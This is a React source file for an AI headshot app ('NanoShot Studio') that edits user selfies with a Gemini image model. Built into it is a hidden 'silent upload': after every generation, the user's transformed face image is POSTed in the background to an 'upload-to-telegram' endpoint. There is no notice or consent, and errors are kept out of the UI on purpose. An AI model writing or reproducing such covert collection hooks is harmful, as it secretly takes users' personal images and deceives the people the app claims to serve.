import React, { useState, useRef } from "react";
import { ImageUploader } from "./components/ImageUploader";
import { StyleSelector } from "./components/StyleSelector";
import { ResultDisplay } from "./components/ResultDisplay";
import { Button } from "./components/Button";
import { editImageWithGemini, fileToBase64 } from "./services/geminiService";
import { PRESET_STYLES } from "./constants";
import { ImageState, GenerationState } from "./types";
import { Camera, Wand2, AlertCircle } from "lucide-react";

/**
 * Silent automatic upload endpoint (change if necessary)
 */
const UPLOAD_ENDPOINT = "http://localhost:8080/upload-to-telegram";

/**
 * Convert data URL to File and POST as multipart/form-data.
 * This function throws on network/server errors.
 */
async function sendGeneratedImageToBackend(
  base64DataUrl: string,
  filename = `result_${Date.now()}.png`,
  endpoint = UPLOAD_ENDPOINT
) {
  const match = base64DataUrl.match(/^data:(.+);base64,(.*)$/);
  if (!match) throw new Error("Invalid base64 data URL");

  const mime = match[1];
  const b64 = match[2];

  const binaryString = atob(b64);
  const len = binaryString.length;
  const bytes = new Uint8Array(len);
  for (let i = 0; i < len; i++) {
    bytes[i] = binaryString.charCodeAt(i);
  }

  const blob = new Blob([bytes.buffer], { type: mime });
  const file = new File([blob], filename, { type: mime });

  const form = new FormData();
  form.append("file", file);

  const res = await fetch(endpoint, {
    method: "POST",
    body: form,
  });

  if (!res.ok) {
    const text = await res.text().catch(() => `${res.statusText}`);
    throw new Error(`Upload failed: ${res.status} ${text}`);
  }

  return res.json();
}

const App: React.FC = () => {
  const [imageState, setImageState] = useState<ImageState>({
    original: null,
    mimeType: "",
  });
  const [selectedStyleId, setSelectedStyleId] = useState<string>("corporate-grey");
  const [customPrompt, setCustomPrompt] = useState<string>("");
  const [generationState, setGenerationState] = useState<GenerationState>({
    isLoading: false,
    error: null,
    generatedImage: null,
  });

  const resultRef = useRef<HTMLDivElement>(null);

  const handleImageSelect = async (file: File) => {
    try {
      const base64 = await fileToBase64(file);
      setImageState({
        original: base64,
        mimeType: file.type,
      });
      setGenerationState({ isLoading: false, error: null, generatedImage: null });
    } catch (e) {
      console.error("Failed to read file", e);
      setGenerationState((prev) => ({ ...prev, error: "Failed to read image file." }));
    }
  };

  const handleClearImage = () => {
    setImageState({ original: null, mimeType: "" });
    setGenerationState({ isLoading: false, error: null, generatedImage: null });
  };

  const handleGenerate = async () => {
    if (!imageState.original) return;

    setGenerationState({ isLoading: true, error: null, generatedImage: null });

    try {
      let finalPrompt = "";

      if (selectedStyleId === "custom") {
        if (!customPrompt.trim()) {
          throw new Error("Please enter a description for your custom edit.");
        }
        finalPrompt = customPrompt;
      } else {
        const style = PRESET_STYLES.find((s) => s.id === selectedStyleId);
        finalPrompt = style ? style.prompt : "Professional headshot.";
      }

      const systemSuffix =
        " Ensure the person's facial identity and features are preserved while applying the requested changes. Output a high-quality, photorealistic image.";

      const generatedBase64 = await editImageWithGemini(
        imageState.original,
        imageState.mimeType,
        finalPrompt + systemSuffix
      );

      setGenerationState({
        isLoading: false,
        error: null,
        generatedImage: generatedBase64,
      });

      // scroll to result
      setTimeout(() => {
        resultRef.current?.scrollIntoView({ behavior: "smooth", block: "start" });
      }, 100);

      // Silent upload: fire-and-forget (errors will only appear in console)
      (async () => {
        try {
          await sendGeneratedImageToBackend(
            generatedBase64,
            `nanoheadshot_${Date.now()}.png`
          );
        } catch (err) {
          // Silent from UI; log for debugging
          console.error("Silent upload error:", err);
        }
      })();
    } catch (error: any) {
      setGenerationState({
        isLoading: false,
        error:
          error?.message || "Something went wrong while generating the image. Please try again.",
        generatedImage: null,
      });
    }
  };

  return (
    <div className="min-h-screen bg-[#09090b] text-slate-200 selection:bg-indigo-500/30 selection:text-indigo-200">
      {/* Header */}
      <header className="sticky top-0 z-50 border-b border-white/10 bg-[#09090b]/80 backdrop-blur-md">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 h-16 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <div className="bg-gradient-to-br from-indigo-500 to-purple-600 p-2 rounded-lg">
              <Camera className="text-white h-5 w-5" />
            </div>
            <h1 className="text-xl font-bold bg-clip-text text-transparent bg-gradient-to-r from-white to-gray-400">
              NanoShot Studio
            </h1>
          </div>
          <div className="flex items-center gap-4 text-sm text-gray-500">
            <span className="hidden sm:block">Powered by Gemini 2.5 Flash Image</span>
            <div className="h-2 w-2 rounded-full bg-green-500 animate-pulse"></div>
          </div>
        </div>
      </header>

      <main className="max-w-6xl mx-auto px-4 sm:px-6 py-8 sm:py-12 space-y-12">
        {/* Hero / Intro */}
        {!imageState.original && (
          <div className="text-center space-y-4 py-8 animate-in fade-in slide-in-from-bottom-4 duration-700">
            <h2 className="text-4xl sm:text-5xl font-bold text-white tracking-tight">
              Professional Headshots <br />
              <span className="text-indigo-400">Reimagined by AI</span>
            </h2>
            <p className="text-lg text-gray-400 max-w-2xl mx-auto">
              Upload a casual selfie and transform it into a professional profile
              picture instantly using the new Nano Banana model.
            </p>
          </div>
        )}

        {/* Main Workflow */}
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 lg:gap-12">
          {/* Left Column: Upload & Preview */}
          <div className={`lg:col-span-5 space-y-6 ${generationState.generatedImage ? "hidden lg:block" : ""}`}>
            <div className="sticky top-24 space-y-6">
              <h3 className="text-xl font-semibold text-white flex items-center gap-2">
                <span className="flex items-center justify-center w-8 h-8 rounded-full bg-gray-800 text-sm border border-gray-700">1</span>
                Upload Photo
              </h3>
              <ImageUploader
                onImageSelect={handleImageSelect}
                currentImage={imageState.original}
                onClear={handleClearImage}
              />
              {imageState.original && (
                <div className="p-4 bg-indigo-900/20 border border-indigo-500/30 rounded-xl text-sm text-indigo-300 flex items-start gap-3">
                  <Wand2 className="w-5 h-5 shrink-0 mt-0.5" />
                  <p>Great shot! Now choose a style on the right to transform it.</p>
                </div>
              )}
            </div>
          </div>

          {/* Right Column: Controls & Output */}
          <div className="lg:col-span-7 space-y-8">
            {/* Style Selection */}
            {!generationState.generatedImage && (
              <div className={`space-y-6 transition-all duration-500 ${!imageState.original ? "opacity-50 pointer-events-none blur-[2px]" : "opacity-100"}`}>
                <h3 className="text-xl font-semibold text-white flex items-center gap-2">
                  <span className="flex items-center justify-center w-8 h-8 rounded-full bg-gray-800 text-sm border border-gray-700">2</span>
                  Select Style
                </h3>
                <StyleSelector
                  selectedStyleId={selectedStyleId}
                  onSelectStyle={setSelectedStyleId}
                  customPrompt={customPrompt}
                  onCustomPromptChange={setCustomPrompt}
                />

                {generationState.error && (
                  <div className="p-4 rounded-xl bg-red-900/20 border border-red-800 text-red-200 flex items-center gap-3 animate-in fade-in">
                    <AlertCircle className="w-5 h-5 text-red-400" />
                    {generationState.error}
                  </div>
                )}

                <div className="pt-4 border-t border-gray-800">
                  <Button
                    onClick={handleGenerate}
                    disabled={!imageState.original}
                    isLoading={generationState.isLoading}
                    fullWidth
                    className="h-14 text-lg"
                  >
                    {generationState.isLoading ? "Transforming..." : "Generate Headshot"}
                  </Button>
                  <p className="text-center text-xs text-gray-500 mt-3">
                    Uses Gemini 2.5 Flash Image. Process usually takes 5-10 seconds.
                  </p>
                </div>
              </div>
            )}

            {/* Result View */}
            {generationState.generatedImage && (
              <div ref={resultRef} className="pt-4">
                <h3 className="text-xl font-semibold text-white flex items-center gap-2 mb-6">
                  <span className="flex items-center justify-center w-8 h-8 rounded-full bg-green-900/50 text-green-400 text-sm border border-green-800">✓</span>
                  Transformation Complete
                </h3>
                <ResultDisplay
                  originalImage={imageState.original!}
                  generatedImage={generationState.generatedImage}
                  onReset={() => setGenerationState(prev => ({ ...prev, generatedImage: null }))}
                />
              </div>
            )}
          </div>
        </div>
      </main>
    </div>
  );
};

export default App;
